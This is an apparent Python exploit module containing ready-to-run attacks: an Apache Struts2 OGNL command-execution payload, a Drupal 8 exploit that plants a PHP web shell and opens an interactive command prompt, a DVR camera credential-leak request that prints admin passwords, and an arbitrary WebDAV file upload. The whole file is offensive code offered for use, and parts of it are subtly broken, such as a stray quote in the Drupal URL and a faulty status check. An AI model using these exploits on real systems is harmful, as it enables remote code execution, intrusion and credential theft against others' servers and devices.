#-*- coding: utf-8 -*-
import requests
from .color import R,G,B,Y,W

class apache_struts_rce:

      def apache_struts2_rce(self,target,cmd):
          self.target = target
          self.cmd = cmd
          payload = "%{(#_='multipart/form-data')."
          payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
          payload += "(#_memberAccess?"
          payload += "(#_memberAccess=#dm):"
          payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
          payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
          payload += "(#ognlUtil.getExcludedPackageNames().clear())."
          payload += "(#ognlUtil.getExcludedClasses().clear())."
          payload += "(#context.setMemberAccess(#dm))))."
          payload += "(#cmd='%s')." % self.cmd
          payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
          payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
          payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
          payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
          payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
          payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
          payload += "(#ros.flush())}"
          headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
          res = requests.post(self.target,headers=headers)
          return res.text
          
class drupal8_rce:


      def proccess(self,target):
          self.target = target
          payload = "<?php system($_GET['cmd']); ?>"
          resp = requests.post(
                               f"{self.target}'/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                               data={'form_id': 'user_register_form', 
                                     '_drupal_ajax': '1',
                                     'mail[#post_render][]': 'exec',
                                     'mail[#type]': 'markup',
                                     'mail[#markup]': 'echo "' + payload + '"> 407.php'}
          )
          cek = requests.get(f"{self.target}/407.php?cmd=whoami").text
          return cek
      
      def drupal_version8_RCE(self,target):
          self.target = target
          x_ = self.proccess(self.target)
          if len(x_) < 15:
             print(f'{G}[*]{W} Vulnerability\nStaring Command Execution....\nType"exit" for stop')
             while True:
                    cmd = str(input('command > '))
                    if 'exit' in cmd:
                        break
                    else:
                        __x = requests.get(f"{self.target}/407.php?cmd={cmd}").text
                        print(__x)
          else:
             print(f'{R}[x]{W} Not Vulnerability : {self.target}')


class dvr_leak_cred:
      

      def dvr_cam_leak_credentials(self,target):
          self.target = target
          hider = {'Host':self.target,
                   'User-Agent':'Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)',
                   'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language':'es-AR,en-US;q=0.7,en;q=0.3',
                   'Connection':'close',
                   'Content-Type':'text/html',
                   'Cookie':'uid=admin'}
          resp = requests.get(
                               f"{self.target}/device.rsp?opt=user&cmd=list",
                               headers=hider,
                               
          )
          if resp == 200:
             print("{G}[*]{W} Vulnerability ")
             dat = resp.json()
             print(f"\tUser : {dat['list'][0]['uid']}\nPassword : {dat['list'][0]['pwd']}")
             print(f"\n\n{dat}")
          else:
             print(f"{R}[x]{W} Not Vulnerability")
             
class webdav:

      def webdav_file_upload(self,target,path,name):
          self.target = target
          self.path = path
          self.name = name
          dat = open(self.path,'rb').read()
          resp = requests.put(
                              f"{self.target}/{self.name}",
                              data=dat,
                              headers={'Content-Type':'application/octet-stream'}
                              )
          cek = requests.get(f"{self.target}/{self.name}").status_code
          if cek == 200:
             print(f"{G}[*]{W} Success Upload : {self.target}/{self.name}")
          else:
             print(f"{R}[x]{W} Failed ! Not Vulnerability ")
